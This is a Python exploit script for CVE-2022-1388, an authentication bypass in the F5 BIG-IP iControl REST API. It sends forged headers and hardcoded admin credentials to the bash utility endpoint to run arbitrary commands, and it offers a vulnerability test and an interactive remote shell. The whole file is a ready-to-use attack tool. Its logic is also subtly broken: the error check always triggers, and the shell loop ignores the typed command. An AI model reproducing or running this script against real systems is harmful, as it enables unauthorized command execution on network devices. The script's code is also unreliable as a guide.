import requests
import optparse


def get_exploit_urt(target_url):
    return f'http://{target_url}/mgmt/tm/util/bash'


def get_exploit_headers():
    return {
        'Host': '127.0.0.1',
        'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
        'X-F5-Auth-Token': 'asdf',
        'Connection': 'X-F5-Auth-Token',
        'Content-Type': 'application/json'
    }


def get_exploit_json(cmd):
    return {"command": "run", "utilCmdArgs": "-c '{0}'".format(cmd)}


def exploit(target_url, cmd):
    res = ""
    err = TypeError
    url = get_exploit_urt(target_url)
    headers = get_exploit_headers()
    j = get_exploit_json(cmd)
    try:
        print(f'\n[+] Making the request with command {cmd}')
        res = requests.post(url, headers=headers, json=j, verify=False)
    except Exception:
        err = Exception
    return res, err


def test_on_vulnr(target_url, cmd):
    print(f'"\nRunning test on target: {target_url} | Command: {cmd}"')
    res, err = exploit(target_url, cmd)
    if err is not None:
        print(f'\nCan not reach the {target_url}')
        exit()
    res.raise_for_status()
    if res.status_code == 401 and err is None:
        print('\nTarget Returned 401 Client Error: F5 Authorization Required')
        print('\nTarget is not vulnerable...')
        exit()
    if res.status_code != 204 and res.headers["content-type"].strip().startswith("application/json"):
        print("Response: " + res.json()['commandResult'].strip())
    else:
        print("Response is empty! Target is not vulnerable..")
        exit()


def get_ps1(target_url):
    cmd = "echo `whoami`@`cat /proc/sys/kernel/hostname`:$PWD"
    res, err = exploit(target_url, cmd)
    if err is not None:
        print(f'\nCan not reach the {target_url}')
        exit()
    res.raise_for_status()
    if res.status_code == 401:
        print('\nTarget Returned 401 Client Error: F5 Authorization Required')
        print('\nTarget is not vulnerable...')
        exit()
    return res.json()['commandResult'].strip()


def cmd_exec(target_url, cmd):
    work = True
    while work:
        command_line = input(get_ps1(target_url) + '$ ')
        if 'exit' in command_line:
            exit()
        res, err = exploit(target_url, cmd)
        if err is not None:
            print(f'\nCan not reach the {target_url}')
            exit()
        if res.status_code != 204 and res.headers["content-type"].strip().startswith("application/json"):
            if 'commandResult' in res.json():
                print("\n" + res.json()['commandResult'].strip())
            else:
                print('\n No results of the command were returned')


def main():
    parser = optparse.OptionParser()
    parser.add_option('-u', '--url', action="store", dest="url", help="The IP address of the target.",required=True)
    parser.add_option('-t', '--test', action="store_true", dest="test", help="Test target for CVE-2022-1388.",
                      default=False)
    parser.add_option('-s', '--shell', action="store_true", dest="shell", help="run an interactive shell.",
                      default=False)
    options, args = parser.parse_args()

    target_url = options.url
    cmd = "whoami"

    if not options.url:
        print('\n[+] Please specify a target.')
        exit()
    if options.test:
        test_on_vulnr(target_url, cmd)
    if options.shell:
        print("\n[+] Running interactive shell..")
        cmd_exec(target_url, cmd)


if __name__ == "__main__":
    main()
